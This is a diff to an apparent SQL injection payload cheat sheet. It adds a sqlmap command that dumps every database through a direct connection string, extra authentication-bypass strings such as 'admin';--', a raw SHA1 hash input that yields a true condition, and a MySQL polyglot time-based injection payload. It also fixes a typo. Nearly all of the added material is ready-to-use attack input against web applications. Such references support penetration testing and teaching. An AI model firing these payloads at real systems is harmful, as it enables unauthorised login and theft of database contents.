@@ -30,7 +30,9 @@ Attempting to manipulate SQL queries may have goals including:
   * [Using Chrome cookie and a Proxy](#using-chrome-cookie-and-a-proxy)
   * [Using suffix to tamper the injection](#using-suffix-to-tamper-the-injection)
   * [General tamper option and tamper's list](#general-tamper-option-and-tampers-list)
+  * [SQLmap without SQL injection](#sqlmap-without-sql-injection)
 * [Authentication bypass](#authentication-bypass)
+  * [Authentication Bypass (Raw MD5 SHA1)](#authentication-bypass-raw-md5-sha1)
 * [Polyglot injection](#polyglot-injection-multicontext)
 * [Routed injection](#routed-injection)
 * [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
@@ -199,6 +201,7 @@ sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/
 python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
 ```
 
+
 ### General tamper option and tamper's list
 
 ```powershell
@@ -224,7 +227,7 @@ tamper=name_of_the_tamper
 |concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
 |charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |
 |charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
-|equaltolike.py | Replaces all occurances of operator equal ('=') with operator 'LIKE'  |
+|equaltolike.py | Replaces all occurrences of operator equal ('=') with operator 'LIKE'  |
 |escapequotes.py | Slash escape quotes (' and ") |
 |greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |
 |halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
@@ -266,6 +269,14 @@ tamper=name_of_the_tamper
 |versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
 |xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For'|
 
+### SQLmap without SQL injection
+
+You can use SQLmap to access a database via its port instead of a URL.
+
+```ps1
+sqlmap.py -d "mysql://user:pass@ip/database" --dump-all 
+```
+
 ## Authentication bypass
 
 ```sql
@@ -288,6 +299,9 @@ tamper=name_of_the_tamper
 "&"
 "^"
 "*"
+'--'
+"--"
+'--' / "--"
 " or ""-"
 " or "" "
 " or ""&"
@@ -340,6 +354,7 @@ admin') or '1'='1'#
 admin') or '1'='1'/*
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
 admin" --
+admin';-- azer 
 admin" #
 admin"/*
 admin" or "1"="1
@@ -362,7 +377,7 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
-## Authentication Bypass (Raw MD5)
+## Authentication Bypass (Raw MD5 SHA1)
 
 When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.
 
@@ -374,6 +389,7 @@ Allowing an attacker to craft a string with a `true` statement such as `' or 'SO
 
 ```php
 md5("ffifdyop", true) = 'or'6�]��!r,��b
+sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
 ```
 
 Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)
@@ -382,6 +398,9 @@ Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.
 
 ```sql
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+
+/* MySQL only */
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
 ```
 
 ## Routed injection
